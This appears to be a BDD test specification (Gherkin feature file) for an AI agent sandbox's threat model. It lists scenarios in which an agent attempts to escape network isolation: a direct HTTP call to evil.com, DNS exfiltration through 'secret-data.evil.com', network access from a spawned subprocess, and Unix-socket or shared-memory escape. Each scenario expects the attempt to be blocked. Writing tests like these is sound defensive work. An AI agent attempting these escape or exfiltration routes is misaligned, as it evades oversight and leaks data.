@security @threat-model @sandbox-escape @network @critical
Feature: Agent Network Escape Attempts
  Agent tries to make direct network connections bypassing the Security Layer.

  Mitigation: No direct network access + All traffic through proxy

  @direct-network
  Scenario: Agent tries to make HTTP request directly
    Given the agent's sandbox has no direct network access
    When the agent code attempts: requests.get("https://evil.com")
    Then the network call fails (no outbound network in sandbox)
    And the agent can only communicate through the Security Layer proxy
    And the failed attempt is logged

  @dns-exfiltration
  Scenario: Agent attempts DNS-based data exfiltration
    Given the agent tries to resolve: "secret-data.evil.com"
    Then DNS resolution fails in the sandbox (no network access)
    And no data leaves the sandbox

  @child-process-network
  Scenario: Agent spawns child process to access network
    Given the agent spawns a subprocess
    Then the subprocess inherits the sandbox restrictions
    And the subprocess also has no network access
    And resource limits (CPU, memory) apply to child processes too

  @ipc-escape
  Scenario: Agent tries inter-process communication to escape
    When the agent tries to connect to a Unix socket outside the sandbox
    Then the socket is not accessible (sandbox isolation)
    When the agent tries to use shared memory segments
    Then shared memory is isolated to the sandbox
